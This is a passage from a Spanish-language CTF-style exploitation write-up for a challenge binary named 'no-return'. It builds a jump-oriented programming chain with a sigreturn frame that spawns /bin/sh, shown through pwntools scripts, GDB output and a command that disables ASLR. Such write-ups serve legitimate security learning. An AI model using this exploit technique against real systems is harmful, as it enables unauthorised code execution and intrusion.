controlar.</p><p>De hecho, no hay <em>gadgets</em> que terminen en <code>ret</code>, todos acaban en una instrucción <code>jmp</code>. Y por esto, la técnica que estamos usando se llama JOP (<em>Jump Oriented Programming</em>).</p><h3 id="creando-espacio-para-el-_payload_">Creando espacio para el <em>payload</em></h3><p>La clave aquí es que tenemos 16 bytes para escribir. Los primeros 8 bytes tienen que tener una dirección que será ejecutada después con la última instrucción <code>jmp</code>. Pero usaré los segundos 8 bytes para dejar la pila más limpia. Entonces, los primeros 8 bytes tendrán la dirección <code>0x40109b</code> (<code>add rsp, 0x8</code>), de manera que volvemos a la instrucción <code>jmp</code>, pero con la pila completamente limpia para el siguiente <em>frame</em>. Los segundos 8 bytes contendrán la dirección del punto de entrada, lo veremos en un momento.</p><p>Por ahora, podemos escribir un bucle en un <em>script</em> en Python que tenga esta funcionalidad:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">python3</span>

<span class="mtk5">from</span> <span class="mtk8 mtku">pwn</span> <span class="mtk5">import</span> <span class="mtk5">*</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span> <span class="mtk5">=</span> <span class="mtk4">'no-return'</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">get_process</span><span class="mtk1">():</span>
    <span class="mtk5">if</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk6">1</span><span class="mtk1">:</span>
        <span class="mtk5">return</span> <span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1">.process()</span>

    <span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk1">port</span> <span class="mtk5">=</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
    <span class="mtk5">return</span> <span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">176</span>
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

    <span class="mtk5">for</span> <span class="mtk1">_</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">):</span>
        <span class="mtk1">leak</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
        <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Stack</span> <span class="mtk4">address</span> <span class="mtk4">leak:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">leak</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

        <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40109b</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40106d</span><span class="mtk1">)</span>

        <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './no-return'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './no-return': pid 1015028  
[<span class="code-blue">*</span>] Stack address leak: 0x7ffcd2a8edb0
[<span class="code-blue">*</span>] Stack address leak: 0x7ffcd2a8edb8
[<span class="code-blue">*</span>] Stack address leak: 0x7ffcd2a8edc0
[<span class="code-blue">*</span>] Stack address leak: 0x7ffcd2a8edc8
[<span class="code-blue">*</span>] Stack address leak: 0x7ffcd2a8edd0
[<span class="code-blue">*</span>] Stack address leak: 0x7ffcd2a8edd8
[<span class="code-blue">*</span>] Stack address leak: 0x7ffcd2a8ede0
[<span class="code-blue">*</span>] Stack address leak: 0x7ffcd2a8ede8
[<span class="code-blue">*</span>] Stopped process './no-return' (pid 1015028)
</code></pre></div><p>Nótese que la dirección del <em>stack</em> se incrementa en <code>8</code> en cada iteración. El hecho es que con este procedimiento, estamos tomando el control sobre los 8 bytes de la pila que quedarán ahí hasta que el programa termine. Podemos modificar un poco el <em>script</em> para verlo en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">176</span>

    <span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break</span> <span class="mtk4">*0x40109f'</span><span class="mtk1">)</span>

    <span class="mtk5">for</span> <span class="mtk1">i</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">):</span>
        <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk8">chr</span><span class="mtk1">(</span><span class="mtk8">ord</span><span class="mtk1">(</span><span class="mtk4">'A'</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk1">i</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

        <span class="mtk1">leak</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
        <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Stack</span> <span class="mtk4">address</span> <span class="mtk4">leak:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">leak</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

        <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40109b</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40106d</span><span class="mtk1">)</span>

        <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
</code></pre></div><p>El <em>script</em> utiliza caracteres diferentes como datos en cada iteración. Podemos ejecutarlo y continuar en GDB unas cuantas veces. Luego, mostramos la pila (<em>stack</em>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green"><span class="code-green">gef➤</span></span>  grep AAAA
<span class="code-blue">[+]</span> Searching 'AAAA' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffc34121000-0x7ffc34142000), permission=rw-
  0x7ffc34140fa8 - 0x7ffc34140fdf  →   "<span class="code-dark-magenta">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGG[...]</span>"  
  0x7ffc34140fac - 0x7ffc34140fe3  →   "<span class="code-dark-magenta">AAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGG[...]</span>"
<span class="code-green"><span class="code-green">gef➤</span></span>  x/100x 0x7ffc34140fa8
<span class="code-dark-blue">0x7ffc34140fa8</span>: 0x41414141      0x41414141      0x42424242      0x42424242
<span class="code-dark-blue">0x7ffc34140fb8</span>: 0x43434343      0x43434343      0x44444444      0x44444444
<span class="code-dark-blue">0x7ffc34140fc8</span>: 0x45454545      0x45454545      0x46464646      0x46464646
<span class="code-dark-blue">0x7ffc34140fd8</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34140fe8</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34140ff8</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34141008</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34141018</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34141028</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34141038</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34141048</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34141058</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34141068</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34141078</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7ffc34141088</span>: 0x0040109b      0x00000000      0x0040106d      0x00000000
<span class="code-dark-blue">0x7ffc34141098</span>: 0x34141b1b      0x00007ffc      0x34141b26      0x00007ffc
<span class="code-dark-blue">0x7ffc341410a8</span>: 0x34141b37      0x00007ffc      0x34141b61      0x00007ffc
<span class="code-dark-blue">0x7ffc341410b8</span>: 0x34141b72      0x00007ffc      0x34141b89      0x00007ffc
<span class="code-dark-blue">0x7ffc341410c8</span>: 0x34141ba7      0x00007ffc      0x34141bc2      0x00007ffc
<span class="code-dark-blue">0x7ffc341410d8</span>: 0x34141bda      0x00007ffc      0x34141bee      0x00007ffc
<span class="code-dark-blue">0x7ffc341410e8</span>: 0x34141c05      0x00007ffc      0x34141c1a      0x00007ffc
<span class="code-dark-blue">0x7ffc341410f8</span>: 0x34141c33      0x00007ffc      0x34141c47      0x00007ffc
<span class="code-dark-blue">0x7ffc34141108</span>: 0x34141c55      0x00007ffc      0x34141c81      0x00007ffc
<span class="code-dark-blue">0x7ffc34141118</span>: 0x34141caa      0x00007ffc      0x34141cb9      0x00007ffc
<span class="code-dark-blue">0x7ffc34141128</span>: 0x34141d00      0x00007ffc      0x34141dc4      0x00007ffc
</code></pre></div><p>Perfecto, hemos encontrado una manera de incrementar el espacio en la pila y controlar lo que escribimos ahí.</p><h3 id="construyendo-el-_payload_">Construyendo el <em>payload</em></h3><p>Para continuar con la explotación, deshabilitaré ASLR localmente y utilizaré direcciones <em>hard-coded</em> para implementar la estrategia mostrada anteriormente.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">echo</span> 0 | <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>  
0
</code></pre></div><p>Si ejecutamos el mismo <em>script</em>, veremos direcciones de memoria fijas porque ASLR está desactivado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green"><span class="code-green">gef➤</span></span>  grep AAAA
<span class="code-blue">[+]</span> Searching 'AAAA' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe6e8 - 0x7fffffffe71f  →   "<span class="code-dark-magenta">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGG[...]</span>"  
  0x7fffffffe6ec - 0x7fffffffe723  →   "<span class="code-dark-magenta">AAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGG[...]</span>"
<span class="code-green"><span class="code-green">gef➤</span></span>  x/100x 0x7fffffffe6e8
<span class="code-dark-blue">0x7fffffffe6e8</span>: 0x41414141      0x41414141      0x42424242      0x42424242
<span class="code-dark-blue">0x7fffffffe6f8</span>: 0x43434343      0x43434343      0x44444444      0x44444444
<span class="code-dark-blue">0x7fffffffe708</span>: 0x45454545      0x45454545      0x46464646      0x46464646
<span class="code-dark-blue">0x7fffffffe718</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe728</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe738</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe748</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe758</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe768</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe778</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe788</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe798</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe7a8</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe7b8</span>: 0x47474747      0x47474747      0x47474747      0x47474747
<span class="code-dark-blue">0x7fffffffe7c8</span>: 0x0040109b      0x00000000      0x0040106d      0x00000000
<span class="code-dark-blue">0x7fffffffe7d8</span>: 0xffffeb1b      0x00007fff      0xffffeb26      0x00007fff
<span class="code-dark-blue">0x7fffffffe7e8</span>: 0xffffeb37      0x00007fff      0xffffeb61      0x00007fff
<span class="code-dark-blue">0x7fffffffe7f8</span>: 0xffffeb72      0x00007fff      0xffffeb89      0x00007fff
<span class="code-dark-blue">0x7fffffffe808</span>: 0xffffeba7      0x00007fff      0xffffebc2      0x00007fff
<span class="code-dark-blue">0x7fffffffe818</span>: 0xffffebda      0x00007fff      0xffffebee      0x00007fff
<span class="code-dark-blue">0x7fffffffe828</span>: 0xffffec05      0x00007fff      0xffffec1a      0x00007fff
<span class="code-dark-blue">0x7fffffffe838</span>: 0xffffec33      0x00007fff      0xffffec47      0x00007fff
<span class="code-dark-blue">0x7fffffffe848</span>: 0xffffec55      0x00007fff      0xffffec81      0x00007fff
<span class="code-dark-blue">0x7fffffffe858</span>: 0xffffecaa      0x00007fff      0xffffecb9      0x00007fff
<span class="code-dark-blue">0x7fffffffe868</span>: 0xffffed00      0x00007fff      0xffffedc4      0x00007fff
</code></pre></div><p>Y estas son las fugas de memoria:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './no-return'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './no-return': pid 1031120  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Stack address leak: 0x7fffffffe7a0
[<span class="code-blue">*</span>] Stack address leak: 0x7fffffffe7a8
[<span class="code-blue">*</span>] Stack address leak: 0x7fffffffe7b0
[<span class="code-blue">*</span>] Stack address leak: 0x7fffffffe7b8
[<span class="code-blue">*</span>] Stack address leak: 0x7fffffffe7c0
[<span class="code-blue">*</span>] Stack address leak: 0x7fffffffe7c8
[<span class="code-blue">*</span>] Stack address leak: 0x7fffffffe7d0
[<span class="code-blue">*</span>] Stack address leak: 0x7fffffffe7d8
[<span class="code-blue">*</span>] Stopped process './no-return' (pid 1031120)
</code></pre></div><p>Genial, ahora vamos a escribir el <em>payload</em> que será ejecutado. En primer lugar, una vez que termine el bucle, saltaremos a <code>0x401000</code>, para configurar el valor de algunos registros:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  401000:       5c                      pop    rsp
  401001:       5f                      pop    rdi
  401002:       5e                      pop    rsi
  401003:       5d                      pop    rbp
  401004:       5a                      pop    rdx
  401005:       59                      pop    rcx
  401006:       5b                      pop    rbx
  401007:       48 31 c0                xor    rax,rax
  40100a:       ff 67 01                jmp    QWORD PTR [rdi+0x1]
</code></pre></div><ul><li><code>$rsp</code> tiene que tener la dirección donde se encuentra el valor que queremos guardar en <code>$rdi</code></li><li>Valores cualesquiera para <code>$rsi</code> y <code>$rbp</code></li><li><code>$rdi</code> tiene que contener una dirección (menos uno) que contenga la dirección de la siguiente instrucción a ejecutar (el <em>gadget</em> de <code>0x40105a</code>)</li><li><code>$rdx</code> tiene que ser<code>0xf</code> (porque el_gadget_ moverá este valor a <code>$rax</code>, y así podremos ejecutar <code>sys_rt_sigreturn</code>)</li><li><code>$rcx</code> tendrá la dirección de una dirección que apunte a una instrucción <code>syscall</code> (<code>0x401082</code> o <code>0x401099</code>)</li><li>Cualquier valor para <code>$rbx</code></li></ul><p>Luego, el programa saltará a la dirección guardada en la dirección apuntada por <code>$rdi+0x1</code>, que es el <em>gadget</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">0x000000000040105a : xchg rax, rdx ; fdivp st(1) ; jmp qword ptr [rcx]
</code></pre></div><p>Aquí, el valor de <code>$rax</code> cambiará a <code>0xf</code>, y el salto llevará al programa a ejecutar <code>sys_rt_sigreturn</code>. Entonces, después de los datos anteriores, pondremos el <em>frame</em> que será restaurado a los registros. En <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> existe una clase llamada <code>SigreturnFrame</code> que ayuda a realizar esta técnica.</p><p>Una vez que los registros están configurados como se dijo antes, el programa resultará en una <em>shell</em>.</p><p>De momento, usaré valores reconocibles para identificar las direcciones que tienen que reemplazarse por valores cualesquiera:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">send_data</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">,</span> <span class="mtk9 mtki">data</span><span class="mtk1">:</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">,</span> <span class="mtk9 mtki">offset</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span><span class="mtk1">)</span> <span class="mtk1">-&gt;</span> <span class="mtk8 mtku">int</span><span class="mtk1">:</span>  
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk9 mtki">data</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk9 mtki">offset</span> <span class="mtk5">//</span> <span class="mtk6">8</span><span class="mtk1">)</span>
    <span class="mtk1">leak</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk9 mtki">p</span>.<span class="mtk8">recv</span>(</span><span class="mtk6">8</span><span class="mtk1">).<span class="mtk8">ljust</span>(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40109b</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40106d</span><span class="mtk1">)</span>

    <span class="mtk9 mtki">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>

    <span class="mtk5">return</span> <span class="mtk1">leak</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">176</span>

    <span class="mtk1">data</span>  <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40105a</span><span class="mtk1">)</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401099</span><span class="mtk1">)</span>

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">acdcacdc</span><span class="mtk1">)</span>     <span class="mtk3"># rdi</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>              <span class="mtk3"># rsi</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>              <span class="mtk3"># rbp</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f</span><span class="mtk1">)</span>            <span class="mtk3"># rdx</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">cafebabe</span><span class="mtk1">)</span>     <span class="mtk3"># rcx</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>              <span class="mtk3"># rbx</span>

    <span class="mtk1">frame</span> <span class="mtk5">=</span> <span class="mtk8 mtku">SigreturnFrame</span><span class="mtk1">()</span>
    <span class="mtk1">frame</span><span class="mtk1">.rax</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">3b</span>
    <span class="mtk1">frame</span><span class="mtk1">.rip</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">401099</span>
    <span class="mtk1">frame</span><span class="mtk1">.rdi</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">f00df00d</span>
    <span class="mtk1">frame</span><span class="mtk1">.rsi</span> <span class="mtk5">=</span> <span class="mtk6">0</span>
    <span class="mtk1">frame</span><span class="mtk1">.rdx</span> <span class="mtk5">=</span> <span class="mtk6">0</span>

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk1">frame</span><span class="mtk1">)</span>

    <span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break</span> <span class="mtk4">*0x401000'</span><span class="mtk1">)</span>

    <span class="mtk5">for</span> <span class="mtk1">i</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">),</span> <span class="mtk6">8</span><span class="mtk1">):</span>
        <span class="mtk8">send_data</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk1">i</span> <span class="mtk1">:</span> <span class="mtk1">i</span> <span class="mtk5">+</span> <span class="mtk6">8</span><span class="mtk1">],</span> <span class="mtk1">offset</span><span class="mtk1">)</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401000</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">deadbeef</span><span class="mtk1">)</span>  <span class="mtk3"># rsp</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><h3 id="perfeccionando-el-_payload_">Perfeccionando el <em>payload</em></h3><p>Agregaré GDB al proceso y pondré un <em>breakpoint</em> en <code>0x401000</code> (en <code>pop rsp</code>). Podemos ejecutar hasta que lleguemos a este punto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  continue
Continuing.

Breakpoint 1, <span class="code-dark-blue">0x0000000000401000</span> in <span class="code-dark-yellow">??</span> ()  
</code></pre></div><p>Vemos el valor <code>0xdeadbeef</code> que irá a <code>$rsp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  x/i $rip
=&gt; <span class="code-dark-blue">0x401000</span>:    pop    rsp
<span class="code-green">gef➤</span>  x/4gx $rsp
<span class="code-dark-blue">0x7fffffffe8e0</span>: 0x00000000deadbeef      0x00007fffffffef46  
<span class="code-dark-blue">0x7fffffffe8f0</span>: 0x00007fffffffef5b      0x00007fffffffefaa
</code></pre></div><p>Tenemos que cambiar <code>0xdeadbeef</code> por la dirección que almacena el valor que irá en <code>$rdi</code>, que es <code>0xacdcacdc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  grep 0xacdcacdc
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">\xdc\xac\xdc\xac</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-  
  0x7fffffffe700 - 0x7fffffffe710  →   "<span class="code-dark-magenta">\xdc\xac\xdc\xac[...]</span>"
</code></pre></div><p>Entonces <code>0xdeadbeef -> 0x7fffffffe700</code>. Continuamos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  si
<span class="code-dark-blue">0x0000000000401001</span> in <span class="code-dark-yellow">??</span> ()  
</code></pre></div><p>Y ponemos el valor de <code>$rsp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  set $rsp = 0x7fffffffe700
<span class="code-green">gef➤</span>  x/i $rip
